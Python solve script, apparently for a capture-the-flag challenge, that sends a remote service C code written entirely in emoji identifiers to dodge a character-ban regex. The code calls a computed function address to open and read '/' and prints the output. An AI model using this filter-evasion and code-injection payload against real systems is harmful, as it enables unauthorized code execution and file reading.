import re
import socket
import time


def build_payload():
    e = lambda x: chr(int(x, 16))

    z = e("1F63A")
    fd = e("1F638")
    n = e("1F639")
    buf = e("1F63B")
    s0 = e("1F63C")
    sx = e("1F63D")
    arr = e("1F64A")
    a1 = e("1F63E")
    a2 = e("1F63F")
    a3 = e("1F640")

    c1 = e("1F641")
    c2 = e("1F642")
    c4 = e("1F643")
    c8 = e("1F609")
    c16 = e("1F60A")
    c32 = e("1F607")
    c64 = e("1F970")
    c128 = e("1F60D")
    c217 = e("1F617")
    c47 = e("1F619")
    c7 = e("1F61A")
    p = e("1F61C")
    p21 = e("1F61B")
    p23 = e("1F61D")
    ten = e("1F61E")
    neg = e("1F61F")
    addr = e("1F620")

    entry = e("1F600")

    parts = []
    parts += [
        f"{z};",
        f"{fd};",
        f"{n};",
        f"*{buf};",
        f"(*{s0})();",
        f"(*{sx})({a1},{a2},{a3});",
        f"{arr}[]={{}};",
        f"{c1};",
        f"{c2};",
        f"{c4};",
        f"{c8};",
        f"{c16};",
        f"{c32};",
        f"{c64};",
        f"{c128};",
        f"{c217};",
        f"{c47};",
        f"{c7};",
        f"{p};",
        f"{p21};",
        f"{p23};",
        f"{ten};",
        f"{neg};",
        f"{addr};",
    ]
    parts += [f"{entry}(){{"]

    parts += [f"{c1}=~(~{z}+~{z});"]
    parts += [
        f"{c2}={c1}+{c1};",
        f"{c4}={c2}+{c2};",
        f"{c8}={c4}+{c4};",
        f"{c16}={c8}+{c8};",
        f"{c32}={c16}+{c16};",
        f"{c64}={c32}+{c32};",
        f"{c128}={c64}+{c64};",
    ]
    parts += [f"{c217}={c128}+{c64}+{c16}+{c8}+{c1};"]
    parts += [f"{c47}={c32}+{c8}+{c4}+{c2}+{c1};"]
    parts += [f"{c7}={c4}+{c2}+{c1};"]

    parts += [f"{p}={c1};"]
    for i in range(2, 24):
        parts += [f"{p}={p}+{p};"]
        if i == 21:
            parts += [f"{p21}={p};"]
        if i == 23:
            parts += [f"{p23}={p};"]

    parts += [f"{ten}={p23}+{p21};"]
    parts += [f"{neg}=~({ten}+~{z});"]
    parts += [f"{addr}={neg}+{c7};"]

    parts += [f"{s0}={addr};", f"{sx}={addr};"]

    parts += [f"{buf}={arr};", f"*{buf}={c47};", f"{buf}={buf}+{c1};", f"*{buf}={z};"]

    parts += [f"(*{s0})({z},{arr},{c2});"]
    parts += [f"{fd}=(*{sx})({arr},{z},{z});"]

    parts += [f"(*{s0})({z},{arr},{c217});"]
    parts += [f"{n}=(*{sx})({fd},{arr},{c217});"]

    parts += [f"(*{s0})({z},{arr},{c1});"]
    parts += [f"(*{sx})({c1},{arr},{n});"]

    parts += ["}"]

    return "".join(parts)


def main():
    payload = build_payload()
    ban = re.compile(r"[\w\s_?&!|$'\"<>^:/^/-]")
    m = ban.search(payload)
    print("payload_len", len(payload))
    print("regex_ok", m is None)
    if m is not None:
        print("first_bad", repr(m.group()))
        return

    s = socket.create_connection(("dyn-01.midnightflag.fr", 12780), timeout=20)
    s.settimeout(180)
    banner = s.recv(4096)
    print(banner.decode("utf-8", "ignore"), end="")

    s.sendall(payload.encode("utf-8") + b"\n" + b"A" * 300)
    s.shutdown(socket.SHUT_WR)

    out = b""
    t0 = time.time()
    while True:
        try:
            chunk = s.recv(8192)
            if not chunk:
                break
            out += chunk
        except socket.timeout:
            print("recv_timeout_s", int(time.time() - t0))
            break
        except Exception:
            break
    s.close()

    print("output_len", len(out))
    print("output_head", out[:400])
    print("output_tail", out[-400:])
    print(out.decode("utf-8", "ignore"))


if __name__ == "__main__":
    main()
